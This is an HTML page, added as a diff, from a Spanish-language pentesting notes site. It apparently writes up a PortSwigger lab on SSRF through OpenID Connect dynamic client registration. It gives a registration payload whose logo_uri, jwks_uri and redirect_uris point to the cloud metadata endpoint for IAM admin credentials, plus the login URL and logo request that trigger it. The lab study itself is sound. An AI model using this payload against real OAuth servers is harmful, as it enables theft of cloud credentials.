@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.well-known/oauth-authorization-server/.well-known/openid-configuration/.well-known/jwks.json&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.well-known/oauth-authorization-server
+/.well-known/openid-configuration
+/.well-known/jwks.json
+</code></pre></div></div>
+
+<p>Para saber si se está usando openid tiene que estar en el scope.
+Además se tiene que recibir en la respuesta un id_token.</p>
+
+<hr />
+
+<p>En este lab <code class="language-plaintext highlighter-rouge">/openid/register</code> está expuesto y es posible usarlo para registrar a un cliente (aplicación que quiere usar el servicio de oauth) con <code class="language-plaintext highlighter-rouge">logo_uri</code> ,<code class="language-plaintext highlighter-rouge">jwks_uri</code> y <code class="language-plaintext highlighter-rouge">redirect_uris</code> maliciosas, que apunten a servicios internos -&gt; SSRF</p>
+
+<p>Estamos ante <strong>Authorization Code Grant Type</strong> (response_type=code) :</p>
+
+<p>Accedemos a <code class="language-plaintext highlighter-rouge">https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/.well-known/openid-configuration</code></p>
+
+<p>Nos tira que el endpoint de registro está en <code class="language-plaintext highlighter-rouge">https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/reg</code></p>
+
+<p>Enviamos un POST con este body</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"application_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"web"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"redirect_uris"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"client_name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Example OIDC Client"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"logo_uri"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"token_endpoint_auth_method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"client_secret_basic"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"grant_types"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"authorization_code"</span><span class="p">,</span><span class="w"> </span><span class="s2">"refresh_token"</span><span class="p">],</span><span class="w">
+  </span><span class="nl">"response_types"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"code"</span><span class="p">],</span><span class="w">
+  </span><span class="nl">"scope"</span><span class="p">:</span><span class="w"> </span><span class="s2">"openid email profile"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"jwks_uri"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userinfo_signed_response_alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"id_token_signed_response_alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Con este hemos creado un nuevo cliente, podemos loguearnos a ese cliente :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://oauth-0aba000a03d782bf807db517023200c5.oauth-server.net/auth?client_id=kzkmrumn1lo2041pfbjtr&amp;redirect_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&amp;response_type=code&amp;scope=openid%20profile%20email
+</code></pre></div></div>
+
+<p>Para que nos cargue el loco internamente al confirmar el login en opeind .</p>
+
+<p>O podemos acceder al logo del cliente directamente :</p>
+
+<pre><code class="language-HTTP">GET /client/CLIENT-ID/logo
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
